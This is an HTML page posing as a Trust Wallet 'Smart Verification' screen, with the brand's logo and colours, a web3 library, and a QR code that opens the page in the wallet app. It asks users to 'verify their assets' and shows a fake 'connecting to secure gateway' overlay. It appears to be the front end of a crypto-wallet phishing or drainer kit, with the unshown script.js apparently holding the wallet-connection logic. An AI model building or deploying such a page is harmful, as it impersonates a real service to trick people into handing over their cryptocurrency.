<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet | Secure Verification</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
    <style>
        body { margin: 0; font-family: -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #1e2329; padding: 30px; border-radius: 24px; text-align: center; width: 90%; max-width: 380px; border: 1px solid #2d3139; }
        .logo { width: 50px; margin-bottom: 10px; }
        h2 { font-size: 20px; color: #3172DE; margin-bottom: 5px; }
        p { color: #929aa5; font-size: 14px; margin-bottom: 20px; }
        
        /* QR Container */
        #qrcode-container { background: white; padding: 15px; border-radius: 20px; border: 4px solid #3172DE; display: inline-block; margin-bottom: 20px; }
        #qrImage { width: 200px; height: 200px; display: block; }
        
        .btn { background: #3172DE; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 4px solid #333; border-top: 4px solid #3172DE; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Logo">
        <h2>Smart Verification</h2>
        <p>Scan with Trust Wallet to verify your assets securely.</p>
        
        <div id="qrcode-container">
            <img id="qrImage" src="" alt="QR Code Loading...">
        </div>

        <button id="nextBtn" class="btn">Verify Assets</button>
    </div>

    <div id="overlay">
        <div class="spinner"></div>
        <p id="status-text" style="color:#3172DE; margin-top:15px; font-weight:bold;">Initializing Node...</p>
        <p id="sub-text" style="color:#555; font-size:12px;">Connecting to secure gateway</p>
    </div>

    <script src="script.js"></script>
    <script>
        // Automatic QR Generator using Google API
        window.onload = function() {
            const currentUrl = window.location.href;
            const qrImg = document.getElementById("qrImage");
            qrImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(currentUrl)}&choe=UTF-8`;
        };
    </script>
</body>
</html>
